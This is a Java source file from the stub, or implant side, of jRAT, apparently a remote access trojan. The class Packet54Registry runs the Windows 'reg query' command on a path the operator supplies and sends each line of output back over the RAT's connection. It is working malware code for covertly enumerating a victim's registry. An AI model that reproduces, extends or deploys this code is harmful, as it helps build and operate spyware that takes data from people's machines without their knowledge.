package se.jrat.stub.packets.outgoing;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;

import se.jrat.common.io.StringWriter;

public class Packet54Registry extends AbstractOutgoingPacket {

	private String path;

	public Packet54Registry(String path) {
		this.path = path;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		try {
			sw.writeLine(path);
			Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });

			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line;

			while ((line = reader.readLine()) != null) {
				dos.writeBoolean(true);
				sw.writeLine(line);
			}
			reader.close();

		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			dos.writeBoolean(false);
		}
	}

	@Override
	public byte getPacketId() {
		return 54;
	}

}
